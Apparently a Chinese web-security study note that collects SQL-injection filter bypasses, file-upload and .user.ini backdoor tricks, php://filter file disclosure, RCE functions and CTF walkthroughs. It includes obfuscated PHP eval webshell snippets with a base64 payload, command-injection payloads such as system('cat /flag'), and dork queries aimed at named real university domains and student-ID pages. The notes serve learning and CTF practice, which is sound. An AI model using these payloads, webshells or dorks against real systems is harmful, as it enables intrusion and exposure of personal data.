## 搜索资源的命令

```php
domain="xmist.edu.cn"
```

**`body`:在它的一个网页代码里面有包含哪些内容**

**如：**

```php
body="/en/student/apply/index"
```

## 敏感信息泄露

**在 `url `后添加一个`uploads`**

```php+HTML
https://www.xmist.edu.cn/uploads/
```

## CNVD证书

#### 事件型

* **必须是高危的  (重要机构)**
* **通用型**

#### POC : (漏洞检测工具)

#### EXP : (漏洞的利用工具)

## 正则表达式

* **[-] 字符范围。匹配指定范围内的任意字符。如： '[a-z]' 可以匹配 'a' 到'z' 范围内的任意小写字母字符****
* **`/` 表示正则表达式的开始，再一个`/` 表示结束**、
* **在结束的`/`后面跟上的为定界符**
* **`i` 表示在和模式进行匹配进不区分大小写**
* **`S`  如果没有使用这个模式修正符号，元字符中的`"."` 默认不能表示换行符号，将串视为单行**

## **单引号逃逸**

* **注释符被过滤**

```sql
SELECT * FROM user WHERE id='$id' LIMIT 0，1

1’ and '1'='1'
```

#### 其他用法

* **&& ： 在`url` 代表参数之间的一个分隔   (但是不能直接输入，要转成url码才可以使用)**  `%26`

```sql
or 和 and 被过滤
||     &&
%7c    %26
```

## 空格绕过

* **如果在尝试注入过程中，发现空格被空格过滤，那么就可以去尝试括号是否被过滤，如果括号未被过滤，那么就可以尝试括号来进行绕过。**
* **因为在mysql中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，多可以用括号包围起来。儿括号的两端可以没有多余的空格**
* **`/**/ ` : 多行注释**

```sql
# 对字段、表名进行包裹，无法对关键字进行包裹
SELECT(name)from(user)where(1=1)and(2=2)

空格被过滤
/**/
select/**/from
%09
```

## 大小绕过

* **在正则匹配中，`select` 和`union` 没有加上 `/i` 是区分大小写匹配的，那就可以通过大小写绕过，如Select 、Union**
* **因为这个正则将匹配的字符直接转为空的，那就可以通过双写绕过。如：selectselect , 当中间的 select 被匹配到就变成空了，那这个字符就变成select**

如：

![image-20231011172034848](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231011172034848.webp)

## 宽字节绕过

如 ：`id=1%df%27/**/order/**?by/**/3%20 --+`

![image-20231011172219239](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231011172219239.webp)  

```sql
%df%26  --> gbk
'\''

select * from user where user_id = '1 *' and *''
```

## 逻辑缺陷

* **水平越权**

* **垂直越权  (低权限如果想要越权高权限 是需要一个接口来)**

```sql
site:hunau.edu.cn.intext:学号
//site:域名。
返回域名中所有的URL地址，它可以探测网站的拓扑结构进行，也是非常的重要，使用非常频繁。比如搜索北京大学所有学院的URL地址，我们输入“学院 site:pku.edu.cn”就可以搜索到它所有的学院
```

## 使用谷歌语法进行搜索

* **在国内由于各种限制导致很多信息都无法直接获取，而谷歌搜索引擎又十分强大，使用独特的谷歌搜索引擎往往可以帮我们收集到一些意想不到的信息。**
* **谷歌搜索引擎在国内无法直接进行访问。但是谷歌也有在中国做有镜像网站，以下为谷歌镜像网站链接**

**1.[s.iit.xyz](https://s.iit.xyz/)**

**2.[note.cm](https://note.cm/)**

**3.[Google](https://www.google.com/)**

#### **谷歌搜索语法命令：**

* **inurl:.edu.cn 统一身份验证**

```
site:指定域名

filetype:指定文件类型

inurl:指定url

intitle:指定title元素内的内容搜索

intext:把网页正文中某个关键字做为搜索条件，然后搜索全世界网页正文中含有这些关键字的网页,allintext：关键字功能相同。

info:这个语法用于搜索指定站点的一些基本信息。比如搜索北京大学网站的一些信息
```

![20200428172116300](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/20200428172116300.webp) 

![20200428172122181](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/20200428172122181.webp) 

**如果想了解更多的语法就移步到[谷歌搜索引擎使用语法大全收集_谷歌语法怎么找cms-CSDN博客](https://blog.csdn.net/xxx0028/article/details/105818546)这篇文章**

## 文件操作

#### 文件上传

* 
* **php.ini是php的一个全局配置文件，对整个web服务起作用；而.user.ini和.htaccess一样是目录的配置文件，.user.ini就是用户自定义的一个php.ini，我们可以利用这个文件来构造后门和隐藏后门**
* **有时可以使用 `../` 来将文件上传到其他目录，达到一个利用的效果。**



```
1 : 服务器脚本语言为PHP
2 : 服务器使用CGI/ FastCGL 模式
3 : 上传目录下要有可执行的PHP文件
```



```php  
eval : 执行代码函数
system : 执行外部程序，并且显示输出
<?php phpinfo();?>
```



#### 文件包含

* **如果是以文本的形式它会直接输出，如果是代码的形式就直接执行**
* **include  ：(语句包含并运行指定文件)**

![image-20231012180659200](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231012180659200.webp)  

```php
//如果想看代码的内容就可以用相关的一个协议

php://filter/read=convert.base64-encode/resource=index.php
//php伪协议，以base64编码输出

<?php
?>
```

## RCE漏洞

* **system()** 
* **passthru()**
* **exec()**
* **shell_exec()**
* **popen()**
* **proc_open()**
* **pcntl_exec()**

#### Web 混淆

```PHP
<?php
    $a=$_GET['x'];		//可以用动态传参 用变量的值来作为我们的变量名
	$$a=$_GET['y'];
	$b($_POST['z']);

	$a = 'b';
	$$a = 'eval';
	$b = 'eval';
	$eval('')
?>
```

#### Web 类混淆

```php
<?php
class x
{
	public $payload = null;
    public $decode_payload = null;
    function _cocnstruct()			//初始化模式
    {		$this->payload='ZXZhbCgkx1BPU1RbYV0pOw==';
     		$this->decode_payload = @base64_decode( $this->payload );
     		@eval("/*sasas23123*/".$this->decode_payload."/*sdfw3123*/");
        
    }
}
nwew x();
?>
```

###  URl绕过

#### **先分析代码**

* **源码中出现`eval($_GET[‘url’])`说明可以使用GET方式以 `url`为参进行传值。**
  **``eval`函数可以将传入的代码当做命令执行；则传入`?url=system('ls /');``**

![image-20231019112722999](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231019112722999.webp) 

**查看根目录下的文件，发现一个``flllllaaaaaaggggggg`文件；再传入`?url=system(“cat /flllllaaaaaaggggggg”);``查看文件，文件中有flag。**

![image-20231019113014675](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231019113014675.webp) 



#### Linux 命令中的空格绕过

* **绕过空格过滤****

　　**1.`${IFS}`绕过**

　　**`$IFS{}`是shell的特殊环境变量,是Linux下的内部区域分隔符。$IFS中存储的值可以使空格、制表符、换行符或者其他自定义符号**。**

　　**2.`$IFS$9`绕过**

```
?url=ls   ：把当前目录并列出来

?url=ls${IFS}/	:查看当前文件的根目录

tab 也是一个空格 ，它转义后是%09
```

　**3.制表符绕过**　

* **tab :  %09是制表符的URL编码,可以通过%09来代替空格，绕过空格过滤**

#### **这里以ctfer中的一个靶场为例：  [SWPUCTF 2021 新生赛babyrce](http://node5.anna.nssctf.cn:28233/)**

**题目描述：**

![image-20231019103541823](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231019103541823.webp)

**点进去可以看到代码中的要求就是`cookie[admin]=1`，如果是将得到一个新的文件，如果不是则输出"echo"的内容**

**打开bp抓包 在里面添加`cookie:admin=1`** **放包** **，查看返回值**

![](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231019101702064.webp)  

**可以看到得到一个新的文件` rasalghul.php`**

![image-20231019104941119](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231019104941119.webp) 

**将文件与url拼接起来，得到新的代码。代码提示我们GET要输入url**

![image-20231019105414006](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231019105414006.webp) 

**再仔细看可以发现是空格绕过， 是用户传入的`url`变量会被`shell_ecec`执行，通过前面的`url`**

**绕过 用``ls`命令来把当前目录列出来得到目录下的flag文件**

![image-20231019105843861](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231019105843861.webp) 

**再用`cat`命令来打开，就可以拿到flag了**

![image-20231019110250455](https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20231019110250455.webp) 

#### 在php中能执行系统命令的关键字 

* **列如：[这都不会，还想web入门？？？？](http://node5.anna.nssctf.cn:28640/)**
* **先找出没有被过滤的 可以看到反引号没有被过滤** 
* **函数?code=print(`l's'`);**
* **?code=print(`ca\\t /fffffffffflagafag`);**

